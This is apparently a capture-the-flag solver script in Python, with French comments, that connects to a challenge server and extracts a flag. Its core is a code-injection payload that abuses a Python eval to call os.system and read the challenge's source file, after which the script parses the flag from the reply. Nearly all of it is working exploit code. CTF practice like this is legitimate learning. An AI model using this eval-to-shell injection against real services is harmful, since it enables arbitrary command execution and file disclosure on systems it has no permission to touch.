from socket import socket

# Connexion au challenge
sock = socket()
sock.connect(("ctf.esnhack.fr", 3002))

# Affichage du message d'arriver
print(sock.recv(1024).decode())

# Envoie de la payload
sock.send("eval('__import__(\"os\").system(\"cat chall.py\")')".encode())
sock.send("\n".encode())

# Réception du résultat et parse pour récupérer que le flag
donnee = sock.recv(1024).decode()
indiceDeb = donnee.find('BDE')
indiceFin = donnee.find('}')
print(donnee[indiceDeb:indiceFin+1])